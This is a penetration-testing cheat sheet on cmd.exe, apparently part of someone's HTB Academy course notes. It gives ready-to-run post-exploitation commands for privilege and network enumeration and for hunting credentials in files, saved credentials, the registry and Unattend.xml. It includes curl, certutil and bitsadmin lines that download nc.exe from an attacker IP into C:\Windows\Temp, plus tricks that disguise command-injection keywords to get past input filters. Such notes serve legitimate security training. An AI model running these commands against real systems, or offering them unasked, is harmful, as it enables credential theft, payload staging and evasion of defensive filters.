# cmd.exe

**Tags:** `#cmd` `#windows` `#commandline` `#postexploitation` `#lolbin` `#commandinjection` `#loot`

The classic Windows command interpreter — still on every Windows host and still the shell
behind **most command-injection sinks and LOLBin chains** (a web app shelling out calls
`cmd`, not PowerShell). Less capable than [[Tools/Command Shell/Powershell|PowerShell]] but
lower-profile and always present, so know the enumeration, chaining, download, and
filter-bypass subset for when you land in a cmd context.

**Docs:** https://learn.microsoft.com/windows-server/administration/windows-commands/
**Install:** built into Windows (`cmd.exe`, `%ComSpec%`).

---

## Operators & Chaining

```bat
a & b        :: run b after a (always)
a && b       :: run b only if a succeeded (exit 0)
a || b       :: run b only if a failed
a | b        :: pipe a's stdout into b
(a & b)      :: group
```

## Enumeration

```bat
whoami /all                              :: user, groups, PRIVILEGES (SeImpersonate/SeBackup?)
net user                                 :: local users;  net user <u> /domain  for domain
net localgroup administrators
ipconfig /all & route print & arp -a
systeminfo                               :: OS/patch level, domain
tasklist /v & sc query                   :: processes / services
set                                      :: environment variables (creds/paths)
dir /s /b C:\Users\*.kdbx C:\*.config    :: hunt files recursively
schtasks /query /fo LIST /v              :: scheduled tasks (persistence/privesc)
```

## Credential Hunting & Loot

```bat
findstr /si password *.txt *.xml *.ini *.config    :: grep files for secrets (recursive)
cmdkey /list                                        :: saved credentials (runas /savecred targets)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query HKLM /f password /t REG_SZ /s             :: search the registry for "password"
type C:\Windows\Panther\Unattend.xml                :: unattended-install creds
```

## Download / Execute (LOLBins)

```bat
:: Modern Windows ships curl.exe and tar.exe
curl http://10.10.14.5:8001/nc.exe -o C:\Windows\Temp\nc.exe
:: certutil (present on older boxes too)
certutil -urlcache -split -f http://10.10.14.5:8001/nc.exe C:\Windows\Temp\nc.exe
:: bitsadmin
bitsadmin /transfer j /download /priority high http://10.10.14.5:8001/nc.exe C:\Windows\Temp\nc.exe
```

## `for /f` loops (scripting in cmd)

```bat
:: ping-sweep a /24
for /l %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i | find "TTL" && echo 10.10.10.%i up
:: iterate lines of a file
for /f "tokens=*" %i in (hosts.txt) do @echo %i
```

> [!warning] In a **batch file** (`.bat`) loop variables double the percent: `%%i` not `%i`.

---

## Filter / Blocklist Bypass

When you have injection but the input is filtered, cmd's parsing hides keywords:

```bat
who^ami                          :: caret escapes the next char (ignored outside quotes)
c^m^d /c whoami
"who"ami  &  wh""oami            :: empty quotes split a token
:: substring env-var expansion builds a blocked word from an existing variable
echo %COMSPEC%                   :: C:\Windows\system32\cmd.exe
%COMSPEC:~10,1%                  :: pull a single char by offset to assemble strings
set x=who&& set y=ami&& call %x%%y%   :: concat via variables + delayed call
```

---

## History

cmd does **not** persist history to disk (unlike Bash's `~/.bash_history` or PowerShell's
PSReadLine file) — `doskey /history` shows only the current session. So there's no cmd
history file to loot, and nothing to scrub after your session.

---

## Quick Reference

| Goal | Command |
|---|---|
| Privileges (privesc triage) | `whoami /all` |
| Local admins / users | `net localgroup administrators` / `net user` |
| Grep files for secrets | `findstr /si password *.txt *.xml *.ini` |
| Saved creds | `cmdkey /list` |
| Registry autologon pw | `reg query "HKLM\...\Winlogon" /v DefaultPassword` |
| Download a file | `curl http://IP:8001/f -o C:\Windows\Temp\f` |
| certutil download | `certutil -urlcache -split -f http://IP:8001/f out` |
| Ping sweep | `for /l %i in (1,1,254) do @ping -n 1 10.10.10.%i \| find "TTL"` |
| Split a keyword (bypass) | `who^ami` · `wh""oami` |

---

> [!note] **See also** — [[Tools/Command Shell/Powershell|PowerShell]] (the richer Windows shell) and [[Tools/Command Shell/Bash|Bash]] (Linux counterpart); reverse shells / TTY in [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]]; the full living-off-the-land binary catalogue is [LOLBAS](https://lolbas-project.github.io/).

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
